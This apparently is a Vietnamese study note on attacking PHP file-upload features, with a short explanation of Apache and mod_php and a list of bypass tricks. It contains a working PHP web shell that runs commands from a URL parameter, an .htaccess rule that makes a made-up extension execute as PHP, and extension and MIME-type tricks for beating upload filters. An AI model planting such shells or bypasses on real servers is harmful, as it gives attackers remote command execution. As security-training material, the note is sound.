# Hoạt động của web:
  <img width="487" alt="image" src="https://github.com/shinyluck/CBJS/assets/76943559/4943dd06-b251-41f5-acdc-1e01776c7fff">
  
- Khi có gói tin HTTP được gửi đến server ví dụ GET /home.html , httpd sẽ tìm trong Document Root file home.html và đẩy ngược lại người dùng
- Apache ở chế độ mặc định không thể xử lý PHP, cần libapache mod php để xử lý hộ, quá trình như sau:
  <img width="454" alt="image" src="https://github.com/shinyluck/CBJS/assets/76943559/f4d8ddb5-cfc0-4344-83a4-8ab644317c50">

- Các file cấu hình cần biết khi làm việc với fileupload của php:
    -   File .htaccess: Dùng để để thiết lập các tùy chọn như thực thi hay loại bỏ tính năng, quản lí các truy cập website
    -   Thiết lập file .htaccess để cho phép các file có đuôi .hanhcute thực thi như 1 file php, từ đó bypass validation extension: AddType application/x-httpd-php .hanhcute


# Những trick lỏ để test fileupload

1. Upload thẳng file shell php:
   
           <?php
            if(isset($_GET['cmd']))
            {
                system($_GET['cmd']);
            }
        ?>
   Lưu ý : có thể thử bằng phpinfo() để không bị filewall chặn
3. Thêm đuôi php vào sau cấc đuôi file được phép upload , ví dụ : .png.php
4. Dùng các đuôi file khác cũng có thể thực thi php như : .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module
5. Upload htaccess  để cho phép các file có đuôi .hanhcute thực thi như 1 file php, từ đó bypass validation extension: AddType application/x-httpd-php .hanhcute
6. Đổi/ không thay đổi MIME type :
<img width="355" alt="image" src="https://github.com/shinyluck/CBJS/assets/76943559/726960e9-720c-497c-8434-738381658903">
7. Thêm ký tự MIMEtype của ảnh vào để bypass validation
   
